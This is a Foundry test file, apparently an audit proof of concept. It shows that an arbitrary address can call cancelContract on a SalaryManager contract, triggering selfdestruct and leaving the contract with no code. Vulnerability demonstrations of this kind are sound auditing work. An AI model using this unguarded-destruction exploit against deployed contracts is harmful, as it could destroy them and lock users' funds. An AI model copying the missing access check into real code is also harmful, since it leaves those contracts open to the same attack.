
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager salaryManager;

    function setUp() public {
        salaryManager = new SalaryManager();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != address(salaryManager));

        // Fund the contract so that address(this).balance > _totalAllocated (which is 0 initially)
        vm.deal(address(salaryManager), 1 ether);

        vm.prank(caller);
        salaryManager.cancelContract();

        // If the call above did not revert, the arbitrary caller successfully triggered selfdestruct.
        // Optionally, we can assert that the contract code is now empty.
        uint256 size;
        assembly {
            size := extcodesize(sload(salaryManager.slot))
        }
        assertEq(size, 0);
    }
}
